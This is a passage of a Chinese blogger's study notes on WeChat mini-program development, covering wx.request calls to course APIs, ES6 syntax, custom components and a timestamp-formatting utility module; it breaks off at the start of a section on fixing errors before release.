<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="发起请求"><a href="#发起请求" class="headerlink" title="发起请求"></a>发起请求</h3><p><code>wx.request</code>:发起HTTPS网络请求。他是封装的ajax，他的写法和jquery的ajax差不多，请求接口里的数据。</p>
<p>属性如下</p>
<p><code>url</code>:开发者服务器接口地址</p>
<p><code>data</code>:请求的参数</p>
<p><code>success</code>:接口调用成功的回调函数</p>
<p>还有很多属性。。</p>
<p>实例，通过网络请求获取接口数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">  datalist:[</span><br><span class="line">    &#123;title:&quot;标题1&quot;,time:&quot;2021-5-20&quot;,url:&quot;&#x2F;images&#x2F;1.jpg&quot;&#125;,</span><br><span class="line">    &#123;title:&quot;标题2&quot;,time:&quot;2021-5-21&quot;,url:&quot;&#x2F;images&#x2F;2.jpg&quot;&#125;,</span><br><span class="line">    &#123;title:&quot;标题3&quot;,time:&quot;2021-5-22&quot;,url:&quot;&#x2F;images&#x2F;3.jpg&quot;&#125;</span><br><span class="line">  ],</span><br><span class="line">  resdata:[]</span><br><span class="line">&#125;,</span><br><span class="line">onLoad: function (options) &#123;</span><br><span class="line">  wx.request(&#123;</span><br><span class="line">    url: &#39;http:&#x2F;&#x2F;edu.newsight.cn&#x2F;wxList.php&#39;,</span><br><span class="line">    data:&#123;&#125;,</span><br><span class="line">    success:res&#x3D;&gt;&#123;</span><br><span class="line">      this.setData(&#123;</span><br><span class="line">        resdata:res.data</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>AppData里可以看到获取的数据：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210520111221654.png" alt="image-20210520111221654"></p>
<p>把获取到的数据用到前面的布局里</p>
<p>wxml:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view class&#x3D;&quot;row&quot; wx:for&#x3D;&quot;&#123;&#123;resdata&#125;&#125;&quot;&gt;</span><br><span class="line">  &lt;view class&#x3D;&quot;pic&quot;&gt;</span><br><span class="line">    &lt;image src&#x3D;&quot;&#123;&#123;item.picurl&#125;&#125;&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;view class&#x3D;&quot;text&quot;&gt;</span><br><span class="line">    &lt;view class&#x3D;&quot;title&quot;&gt;&#123;&#123;item.title&#125;&#125;&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;view class&#x3D;&#39;time&#39;&gt;&#123;&#123;item.posttime&#125;&#125;-&#123;&#123;item.author&#125;&#125;&lt;&#x2F;view&gt;</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br></pre></td></tr></table></figure>

<p>js:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">  resdata:[]</span><br><span class="line">&#125;,</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 生命周期函数--监听页面加载</span><br><span class="line"> *&#x2F;</span><br><span class="line">onLoad: function (options) &#123;</span><br><span class="line">  wx.request(&#123;</span><br><span class="line">    url: &#39;http:&#x2F;&#x2F;edu.newsight.cn&#x2F;wxList.php&#39;,</span><br><span class="line">    data:&#123;</span><br><span class="line">      num:5,</span><br><span class="line">      page:2</span><br><span class="line">    &#125;,</span><br><span class="line">    success:res&#x3D;&gt;&#123;</span><br><span class="line">      this.setData(&#123;</span><br><span class="line">        resdata:res.data</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210520112130133.png" alt="image-20210520112130133"></p>
<p>再写一个下一页跳转按钮，把网络请求写成一个getList方法来用，在data里设置一个num变量，用它自增长来获取下一页</p>
<p>wxml：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view class&#x3D;&quot;row&quot; wx:for&#x3D;&quot;&#123;&#123;resdata&#125;&#125;&quot; wx:key&#x3D;&quot;index&quot;&gt;</span><br><span class="line">  &lt;view class&#x3D;&quot;pic&quot;&gt;</span><br><span class="line">    &lt;image src&#x3D;&quot;&#123;&#123;item.picurl&#125;&#125;&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;view class&#x3D;&quot;text&quot;&gt;</span><br><span class="line">    &lt;view class&#x3D;&quot;title&quot;&gt;&#123;&#123;item.title&#125;&#125;&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;view class&#x3D;&#39;time&#39;&gt;&#123;&#123;item.posttime&#125;&#125;-&#123;&#123;item.author&#125;&#125;&lt;&#x2F;view&gt;</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br><span class="line">&lt;button bindtap&#x3D;&quot;nextpage&quot; type&#x3D;&quot;primary&quot;&gt;下一页&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure>

<p>js:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">    resdata:[],</span><br><span class="line">    num:1</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;**</span><br><span class="line">   * 生命周期函数--监听页面加载</span><br><span class="line">   *&#x2F;</span><br><span class="line">  nextpage:function()&#123;</span><br><span class="line">    this.data.num++</span><br><span class="line">    this.getList(this.data.num);</span><br><span class="line">  &#125;,</span><br><span class="line">  getList:function(p&#x3D;1)&#123;&#x2F;&#x2F;不传参默认p&#x3D;1</span><br><span class="line">    wx.request(&#123;</span><br><span class="line">      url: &#39;http:&#x2F;&#x2F;edu.newsight.cn&#x2F;wxList.php&#39;,</span><br><span class="line">      data:&#123;</span><br><span class="line">        num:5,</span><br><span class="line">        page:p</span><br><span class="line">      &#125;,</span><br><span class="line">      success:res&#x3D;&gt;&#123;</span><br><span class="line">        console.log(res)</span><br><span class="line">        this.setData(&#123;</span><br><span class="line">          resdata:res.data</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  onLoad: function (options) &#123;</span><br><span class="line">    this.getList();</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210520114422775.png" alt="image-20210520114422775"></p>
<h2 id="ES6的用法"><a href="#ES6的用法" class="headerlink" title="ES6的用法"></a>ES6的用法</h2><p>1.const和let用法</p>
<p>参考之前写的笔记 <a href="https://tianzeee.github.io/2021/04/12/JavaScript/#JavaScript-let和const" target="_blank" rel="noopener">https://tianzeee.github.io/2021/04/12/JavaScript/#JavaScript-let%E5%92%8Cconst</a></p>
<p>简单来说就是const定义常量，let定义块级变量</p>
<p>2.模板字面量</p>
<blockquote>
<p>模板字面量是增强版的字符串，它用反引号（`）标识</p>
<p>模板字面量看上去仅仅是普通JS字符串的升级版，但二者之间真正的区别在于模板字面量的变量占位符。变量占位符允许将任何有效的JS表达式嵌入到模板字面量中，并将其结果输出为字符串的一部分</p>
<p>变量占位符由起始的 ${ 与结束的 } 来界定，之间允许放入任意的 JS 表达式。最简单的变量占位符允许将本地变量直接嵌入到结果字符串中</p>
</blockquote>
<p>使用模板字面量便于字符串拼接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var name&#x3D;&quot;张三&quot;;</span><br><span class="line">var age&#x3D;20;</span><br><span class="line">var gender&#x3D;&quot;男&quot;</span><br><span class="line">var person&#x3D;&#96;我的名字是$&#123;name&#125;,我的年龄是$&#123;age&#125;,我是$&#123;gender&#125;生&#96;;</span><br><span class="line">&#x2F;&#x2F;传统写法如下</span><br><span class="line">&#x2F;&#x2F;var person&#x3D;&quot;我的名字是&quot;+name+&quot;,我的年龄是&quot;+age+&quot;,我是&quot;+gender+&quot;生&quot;;</span><br><span class="line">document.write(person);</span><br></pre></td></tr></table></figure>

<p>JS不支持多行字符串，但是用模板字面量可以随意换行，在里面写一些html标签就变得容易了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var title&#x3D;&#96;</span><br><span class="line">&lt;h1&gt;</span><br><span class="line">	啦啦啦</span><br><span class="line">	&lt;em&gt;你好$&#123;name&#125;&lt;&#x2F;em&gt;</span><br><span class="line">&lt;&#x2F;h1&gt;&#96;;</span><br><span class="line">document.write(title);</span><br></pre></td></tr></table></figure>

<p>4.解构赋值</p>
<p>交换值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a&#x3D;1;</span><br><span class="line">var b&#x3D;2;</span><br><span class="line">[a,b]&#x3D;[b,a];</span><br><span class="line">console.log(a,b) &#x2F;&#x2F;2 1</span><br></pre></td></tr></table></figure>

<p>数组解构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr&#x3D;[1,2,3,4];</span><br><span class="line">var [a,,b]&#x3D;arr;</span><br><span class="line">console.log(a,b); &#x2F;&#x2F;1 3</span><br></pre></td></tr></table></figure>

<p>对象解构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var obj&#x3D;&#123;</span><br><span class="line">	name:&quot;张三&quot;,</span><br><span class="line">	age:20,</span><br><span class="line">	gender:&quot;fale&quot;,</span><br><span class="line">	job:&quot;前端开发&quot;</span><br><span class="line">&#125;;</span><br><span class="line">var &#123;name,job&#125;&#x3D;obj;</span><br><span class="line">console.log(name,job); &#x2F;&#x2F;张三 前端开发</span><br></pre></td></tr></table></figure>

<p>5.箭头函数</p>
<p>参考之前笔记 <a href="https://tianzeee.github.io/2021/04/15/JavaScript-function/#箭头函数" target="_blank" rel="noopener">https://tianzeee.github.io/2021/04/15/JavaScript-function/#%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0</a></p>
<p>箭头函数会默认帮我们绑定外层 this 的值，所以在箭头函数中 this 的值和外层的 this 是一样的。</p>
<p>6.默认参数</p>
<p>参考之前笔记 <a href="https://tianzeee.github.io/2021/04/15/JavaScript-function/#默认参数" target="_blank" rel="noopener">https://tianzeee.github.io/2021/04/15/JavaScript-function/#%E9%BB%98%E8%AE%A4%E5%8F%82%E6%95%B0</a></p>
<p>7.循环遍历</p>
<p>for-of遍历</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr&#x3D;[1,2,3,4];</span><br><span class="line">for(var i of arr)&#123;</span><br><span class="line">	console.log(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>forEach遍历</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr&#x3D;[1,2,3,4];</span><br><span class="line">arr.forEach((val,index)&#x3D;&gt;&#123;</span><br><span class="line">	console.log(val,index);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>8.展开运算符…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr&#x3D;[1,2,3,4];</span><br><span class="line">var arr2&#x3D;[&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;];</span><br><span class="line">&#x2F;&#x2F;arr&#x3D;arr.concat(arr2); &#x2F;&#x2F;老写法</span><br><span class="line">arr&#x3D;[...arr,...arr2];</span><br><span class="line">console.log(arr);</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://developers.weixin.qq.com/miniprogram/dev/api/" target="_blank" rel="noopener">https://developers.weixin.qq.com/miniprogram/dev/api/</a></p>
<p><a href="https://www.cnblogs.com/xiaohuochai/p/7234281.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaohuochai/p/7234281.html</a></p>
]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
  </entry>
  <entry>
    <title>微信小程序学习笔记3</title>
    <url>/2021/05/23/wx-small-program3/</url>
    <content><![CDATA[<p>续二，学习剩下的自定义组件、数据接口调用、页面数据渲染并修改时间戳等等<a id="more"></a></p>
<h2 id="自定义组件"><a href="#自定义组件" class="headerlink" title="自定义组件"></a>自定义组件</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>自定义组件可以方便我们复用写过的代码，提高代码重用率和工作效率，把很多地方都要用到的相同的代码写成组件就可以减少代码量提高工作效率，就好比之前项目里的header和footer这两个类，在首页上也有，跳转到平面设计二级页面也要用，如果要复制就比较麻烦，用自定义组件直接封装好这两个东西，要用的时候直接引用就好了，这就类似PHP里面的文件包含include，把写好的代码拿过来用。另外，他也方便多人协同开发，每个人写不同的组件，要用的时候直接引用就可以了</p>
<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>在根目录下创建一个新文件夹，存放组件库，名字可以随便取，但是为了方便他人理解最好命名为components，然后在components文件夹下再创建新的文件夹，名字就是自定义组件的名字比如我想在wxml里用<code>&lt;tianze&gt;&lt;/tianze&gt;</code>这个组件，那么就取名叫tianze，然后右键tianze文件夹点击新建component再取名tianze，然后会出来四个文件(tianze.js、tianze.json、tianze.wxml、tianze.wxss)，然后在tianze.wxml里写内容，tianze.wxss里写样式，写完之后，在你需要用到自定义组件的页面里的json文件里有个<code>usingComponents</code>对象，在里面加上<code>&quot;tianze&quot;:&quot;/components/tianze/tianze&quot;</code>，属性名是组件名属性值是组件路径，这样在index.wxml里就可以用<code>&lt;tianze&gt;&lt;/tianze&gt;</code>这个自定义组件了</p>
<p>注意：不要取header和footer名，因为html里有这俩个标签了，命名最好用驼峰命名法，这样看到就知道是自定义组件了，另外自定义组件单标签、对标签都可以使用</p>
<h3 id="将头部和底部用自定义组件独立出来"><a href="#将头部和底部用自定义组件独立出来" class="headerlink" title="将头部和底部用自定义组件独立出来"></a>将头部和底部用自定义组件独立出来</h3><p>就把index.wxml里的header类复制到新建的HdView组件的wxml里，把index.wxss里的header类样式也复制到HdView组件的wxss里，然后在index.json里加上<code>&quot;HdView&quot;:&quot;/components/HdView/HdView&quot;</code>然后把index.wxml里的header删掉替换成<code>&lt;HdView&gt;&lt;/HdView&gt;</code>就可以了，底部同理</p>
<p>效果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523135300695.png" alt="image-20210523135300695"></p>
<h3 id="自定义组件的属性传值"><a href="#自定义组件的属性传值" class="headerlink" title="自定义组件的属性传值"></a>自定义组件的属性传值</h3><p>这里以下图为例，将自定义自己的属性传值</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523142657028.png" alt="image-20210523142657028"></p>
<p>1.在自定义组件的js里的properti中，设置自定义属性，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">properties: &#123;</span><br><span class="line">	&#x2F;&#x2F;myTitle和myUrl是自定义是属性名，需要指定type类型(String、Number、Array、Object等等)，指定value默认值</span><br><span class="line">    myTitle:&#123;</span><br><span class="line">      type:String,</span><br><span class="line">      value:&quot;&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    myUrl:&#123;</span><br><span class="line">      type:String,</span><br><span class="line">      value:&quot;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>2.在wxml中渲染从前端传递过来的属性，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view class&#x3D;&#39;pubTitle&#39;&gt;</span><br><span class="line">  &lt;view class&#x3D;&#39;txt&#39;&gt;&#123;&#123;myTitle&#125;&#125;&lt;&#x2F;view&gt;</span><br><span class="line">  &lt;navigator url&#x3D;&quot;&#123;&#123;myUrl&#125;&#125;&quot; class&#x3D;&#39;more&#39; open-type&#x3D;&quot;reLaunch&quot;&gt;更多&gt;&lt;&#x2F;navigator&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br></pre></td></tr></table></figure>

<p>3.在自定义组件上设置属性值，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;PubTitle myTitle&#x3D;&quot;学员作品&quot; myUrl&#x3D;&quot;&#x2F;pages&#x2F;works&#x2F;works&quot;&gt;&lt;&#x2F;PubTitle&gt;</span><br><span class="line">&lt;PubTitle myTitle&#x3D;&quot;行业动态&quot; myUrl&#x3D;&quot;&#x2F;pages&#x2F;dynamic&#x2F;dynamic&quot;&gt;&lt;&#x2F;PubTitle&gt;</span><br></pre></td></tr></table></figure>

<p>这样就能实现不同的字体显示和不同的跳转，因为works页面和dynamic页面是tabBar页面，所以导航组件的open-type要设置成reLaunch，不然默认的值无法跳转</p>
<h2 id="数据接口的调用方法"><a href="#数据接口的调用方法" class="headerlink" title="数据接口的调用方法"></a>数据接口的调用方法</h2><p>调用api接口，在之前的微信小程序API里的网络说过，参考 <a href="https://tianzeee.github.io/2021/05/20/wx-small-program2/#网络" target="_blank" rel="noopener">https://tianzeee.github.io/2021/05/20/wx-small-program2/#%E7%BD%91%E7%BB%9C</a></p>
<h2 id="将数据渲染到页面并修改时间戳"><a href="#将数据渲染到页面并修改时间戳" class="headerlink" title="将数据渲染到页面并修改时间戳"></a>将数据渲染到页面并修改时间戳</h2><p>这里是将首页行业动态里的图片、标题、作者和时间从网络接口动态获取到，并且渲染到页面</p>
<p>下图是原本的行业动态：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523162418740.png" alt="image-20210523162418740"></p>
<p>用老师做好的api来获取数据 <a href="https://ku.qingnian8.com/show.php?cid=16&amp;id=64&amp;type=list" target="_blank" rel="noopener">https://ku.qingnian8.com/show.php?cid=16&amp;id=64&amp;type=list</a></p>
<p>打开接口地址看看：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523165323851.png" alt="image-20210523165323851"></p>
<p>默认应该是下面这样杂乱无章的json数据</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523165402825.png" alt="image-20210523165402825"></p>
<p>在谷歌商场里安装一个叫JSON Viewer的插件，数据就可以变得如下图清楚了</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523165233025.png" alt="image-20210523165233025"></p>
<p>直接调用api的话会报错，需要在详情-本地设置里勾选不校验合法域名……，然后就可以看到数据了，如图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523154831702.png" alt="image-20210523154831702"></p>
<p>修改index.js在页面加载函数里写网络请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">onLoad: function (options) &#123;</span><br><span class="line">   &#x2F;&#x2F;发送网络请求获取真实的行业动态数据</span><br><span class="line">   wx.request(&#123;</span><br><span class="line">     url: &#39;https:&#x2F;&#x2F;ku.qingnian8.com&#x2F;school&#x2F;list.php&#39;,</span><br><span class="line">     success:res&#x3D;&gt;&#123;</span><br><span class="line">       res.data.forEach(item&#x3D;&gt;&#123;</span><br><span class="line">         var time&#x3D;item.posttime*1000;</span><br><span class="line">         var d&#x3D;new Date(time);</span><br><span class="line">         var year&#x3D;d.getFullYear();</span><br><span class="line">         var month&#x3D;d.getMonth()+1;</span><br><span class="line">         month&#x3D;((month&gt;&#x3D;10)?&quot;:&quot;:&quot;:0&quot;)+month;</span><br><span class="line">         var day&#x3D;d.getDate();</span><br><span class="line">         day&#x3D;((day&gt;&#x3D;10)?&quot;:&quot;:&quot;:0&quot;)+day;</span><br><span class="line">         var posttime&#x3D;year+month+day;</span><br><span class="line">         item.posttime&#x3D;posttime;</span><br><span class="line">       &#125;)</span><br><span class="line">       this.setData(&#123;</span><br><span class="line">         dataList:res.data</span><br><span class="line">       &#125;)</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;)</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure>

<p>由于api提供的时间是时间戳数据，时间戳是1970年1月1日到现在具体的某个时间所经过的时间，php记录的时间戳是秒数，js记录的是毫秒数。</p>
<p>如下图</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523163133800.png" alt="image-20210523163133800"></p>
<p>因为<code>res.data</code>是请求服务器返回的数据，他是一个数组，里面有9个对象，用<code>forEach</code>函数循环遍历每个<code>res.data</code>里的对象用js处理，要将时间戳转换成具体时间就先乘1000然后用Date函数获取具体时间，剩下的js就是获取年月日，然后用三目运算符判断一下如果是个位数前面加个”:0”，这样不论月和日是单位数还是个位数都是两位数看起来好看，这里有一个要注意的点是函数获取的月份范围是0-11，所以要手动加1，最后拼接出一个具体的posttime然后赋值给item.posttime，最后用<code>this.setData</code>函数设置一个dataList变量并把res.data赋给他，这个dataList就会到data对象里了，这样前端渲染的时候就可以用了</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523163405676.png" alt="image-20210523163405676"></p>
<p>修改index.wxml，把请求api获取到的数据渲染到前端上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;navigator class&#x3D;&#39;dyItem&#39; wx:for&#x3D;&quot;&#123;&#123;dataList&#125;&#125;&quot;&gt;</span><br><span class="line">  &lt;view class&#x3D;&#39;pic&#39;&gt;</span><br><span class="line">    &lt;image src&#x3D;&#39;&#123;&#123;item.picurl&#125;&#125;&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;view class&#x3D;&#39;txt&#39;&gt;</span><br><span class="line">    &lt;view class&#x3D;&#39;title&#39;&gt;&#123;&#123;item.title&#125;&#125;&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;view class&#x3D;&#39;info&#39;&gt;</span><br><span class="line">      &lt;text space&#x3D;&quot;ensp&quot;&gt;作者:&#123;&#123;item.author&#125;&#125;  -  时间:&#123;&#123;item.posttime&#125;&#125;&lt;&#x2F;text&gt;</span><br><span class="line">    &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;navigator&gt;</span><br></pre></td></tr></table></figure>

<p>效果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523164829289.png" alt="image-20210523164829289"></p>
<p>本来我们希望行业动态里是5个导航组件，因为接口每一页默认返回9个对象，那么<code>wx:for=&quot;&quot;</code>就会在行业动态里生成9个导航组件，为了让他变成5个需要在请求的时候加上请求参数num就可以了</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523170059126.png" alt="image-20210523170059126"></p>
<p>修改js代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">onLoad: function (options) &#123;</span><br><span class="line">  &#x2F;&#x2F;发送网络请求获取真实的行业动态数据</span><br><span class="line">  wx.request(&#123;</span><br><span class="line">    url: &#39;https:&#x2F;&#x2F;ku.qingnian8.com&#x2F;school&#x2F;list.php&#39;,</span><br><span class="line">    data:&#123;</span><br><span class="line">      num:5</span><br><span class="line">    &#125;,</span><br><span class="line">    success:res&#x3D;&gt;&#123;</span><br><span class="line">      res.data.forEach(item&#x3D;&gt;&#123;</span><br><span class="line">        var time&#x3D;item.posttime*1000;</span><br><span class="line">        var d&#x3D;new Date(time);</span><br><span class="line">        var year&#x3D;d.getFullYear();</span><br><span class="line">        var month&#x3D;d.getMonth()+1;</span><br><span class="line">        month&#x3D;((month&gt;&#x3D;10)?&quot;:&quot;:&quot;:0&quot;)+month;</span><br><span class="line">        var day&#x3D;d.getDate();</span><br><span class="line">        day&#x3D;((day&gt;&#x3D;10)?&quot;:&quot;:&quot;:0&quot;)+day;</span><br><span class="line">        var posttime&#x3D;year+month+day;</span><br><span class="line">        item.posttime&#x3D;posttime;</span><br><span class="line">      &#125;)</span><br><span class="line">      console.log(res.data)</span><br><span class="line">      this.setData(&#123;</span><br><span class="line">        dataList:res.data</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>其实就只是加了一个data请求属性里面写上请求个数为5就行了</p>
<p>效果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523170341735.png" alt="image-20210523170341735"></p>
<p>看他的接口参数还有页数也可以写进请求参数里</p>
<h2 id="ES6模块化封装公共函数"><a href="#ES6模块化封装公共函数" class="headerlink" title="ES6模块化封装公共函数"></a>ES6模块化封装公共函数</h2><p>前面获取日期的时候用js写了一大堆代码去拼接出一个最终的函数，放在那里面很乱很多，而且可能其他地方也会用到，所以干脆就把他封装成一个公共函数来用</p>
<p>参考官方文档的框架下框架接口里有个模块化 <a href="https://developers.weixin.qq.com/miniprogram/dev/reference/api/require.html" target="_blank" rel="noopener">https://developers.weixin.qq.com/miniprogram/dev/reference/api/require.html</a></p>
<p>之前说过utils文件夹是公共文件夹，可以在里面存放js等文件。那我就再utils文件夹里新建文件名为public.js，各种功能的js代码网上很多搜一下可以复制过来，然后只要根据他要求的参数会调用就可以了，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var common&#x3D;&#123;</span><br><span class="line">  getStrLen:function(str,len)&#123;</span><br><span class="line">    if(str.length&gt;len)&#123;</span><br><span class="line">      return str.substr(0,len)+&quot;...&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      return str;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  getMyData:function(timestamp, formats)&#123;</span><br><span class="line">    &#x2F;&#x2F; formats格式包括</span><br><span class="line">    &#x2F;&#x2F; 1. Y-m-d</span><br><span class="line">    &#x2F;&#x2F; 2. Y-m-d H:i:s</span><br><span class="line">    &#x2F;&#x2F; 3. Y年m月d日</span><br><span class="line">    &#x2F;&#x2F; 4. Y年m月d日 H时i分</span><br><span class="line">    formats &#x3D; formats || &#39;Y-m-d&#39;;</span><br><span class="line">    var zero &#x3D; function (value) &#123;</span><br><span class="line">        if (value &lt; 10) &#123;</span><br><span class="line">            return &#39;0&#39; + value;</span><br><span class="line">        &#125;</span><br><span class="line">        return value;</span><br><span class="line">    &#125;;</span><br><span class="line">    var timestamp&#x3D;timestamp*1000;</span><br><span class="line">    var myDate &#x3D; timestamp? new Date(timestamp): new Date();</span><br><span class="line">    var year &#x3D; myDate.getFullYear();</span><br><span class="line">    var month &#x3D; zero(myDate.getMonth() + 1);</span><br><span class="line">    var day &#x3D; zero(myDate.getDate());</span><br><span class="line">    var hour &#x3D; zero(myDate.getHours());</span><br><span class="line">    var minite &#x3D; zero(myDate.getMinutes());</span><br><span class="line">    var second &#x3D; zero(myDate.getSeconds());</span><br><span class="line">    return formats.replace(&#x2F;Y|m|d|H|i|s&#x2F;ig, function (matches) &#123;</span><br><span class="line">        return (&#123;</span><br><span class="line">            Y: year,</span><br><span class="line">            m: month,</span><br><span class="line">            d: day,</span><br><span class="line">            H: hour,</span><br><span class="line">            i: minite,</span><br><span class="line">            s: second</span><br><span class="line">        &#125;)[matches];</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">module.exports&#x3D;common</span><br><span class="line">&#x2F;&#x2F;其他写法如下,只能返回单个函数</span><br><span class="line">&#x2F;&#x2F; export function fun() &#123;</span><br><span class="line">&#x2F;&#x2F; &#125;</span><br></pre></td></tr></table></figure>

<p>在public.js文件里写模块，里面写了一个common对象，对象里有两个函数，一个是限制标题显示字数超过部分用…表示，一个是将时间戳转换为时间的函数，最后用<code>module.exports=common</code>将common对象向外暴露，这样外面就能用了。</p>
<p>然后修改index.js文件，引入上面写好的模块public.js文件，然后把原来处理时间戳的代码删除，直接用模块里写好的函数就可以了，index.js内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import common from &quot;..&#x2F;..&#x2F;utils&#x2F;public.js&quot;;</span><br><span class="line">Page(&#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;**</span><br><span class="line">   * 页面的初始数据</span><br><span class="line">   *&#x2F;</span><br><span class="line">  data: &#123;</span><br><span class="line">  </span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  &#x2F;**</span><br><span class="line">   * 生命周期函数--监听页面加载</span><br><span class="line">   *&#x2F;</span><br><span class="line">  onLoad: function (options) &#123;</span><br><span class="line">    &#x2F;&#x2F;发送网络请求获取真实的行业动态数据</span><br><span class="line">    wx.request(&#123;</span><br><span class="line">      url: &#39;https:&#x2F;&#x2F;ku.qingnian8.com&#x2F;school&#x2F;list.php&#39;,</span><br><span class="line">      data:&#123;</span><br><span class="line">        num:5</span><br><span class="line">      &#125;,</span><br><span class="line">      success:res&#x3D;&gt;&#123;</span><br><span class="line">        res.data.forEach(item&#x3D;&gt;&#123;</span><br><span class="line">          item.posttime&#x3D;common.getMyData(item.posttime,&quot;Y-m-d&quot;)</span><br><span class="line">          item.title&#x3D;common.getStrLen(item.title,25)</span><br><span class="line">        &#125;)</span><br><span class="line">        this.setData(&#123;</span><br><span class="line">          dataList:res.data</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>引入方法和python引入模块差不多，路径好像只能用相对路径，使用绝对路径我报错了，引入后在监听页面加载函数里，加个遍历函数里面调用模块的两个函数就可以了。其实这个标题限制文字长度可以用css去写，这里只是用他来理解模块化的应用</p>
<h2 id="代码整合及小程序上线流程"><a href="#代码整合及小程序上线流程" class="headerlink" title="代码整合及小程序上线流程"></a>代码整合及小程序上线流程</h2><p>首先解决一下两个报错</p>
<p>第一个：</p>
